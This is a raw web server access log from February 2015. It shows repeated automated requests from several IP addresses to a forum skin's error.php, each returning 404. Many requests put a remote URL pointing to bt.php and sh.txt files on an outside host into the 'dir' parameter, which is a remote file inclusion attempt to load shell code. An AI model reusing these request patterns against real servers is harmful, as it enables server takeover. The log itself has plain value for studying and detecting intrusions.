91.121.6.123 - - [13/Feb/2015:20:57:17 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
112.218.68.155 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
91.121.6.123 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)" 
112.218.68.155 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
91.121.6.123 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
91.121.6.123 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6" 
176.31.252.38 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
112.218.68.155 - - [13/Feb/2015:20:57:18 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
91.121.6.123 - - [13/Feb/2015:20:57:18 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Gigabot/3.0 (http://www.gigablast.com/spider.html)" 
176.31.252.38 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
112.218.68.155 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
176.31.252.38 - - [13/Feb/2015:20:57:18 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)" 
1.224.163.80 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
112.218.68.155 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)" 
91.121.6.123 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
176.31.252.38 - - [13/Feb/2015:20:57:18 -0800] "GET //bbs/skin/zero_vote/error.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [13/Feb/2015:20:57:19 -0800] "POST //bbs/skin/zero_vote/error.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
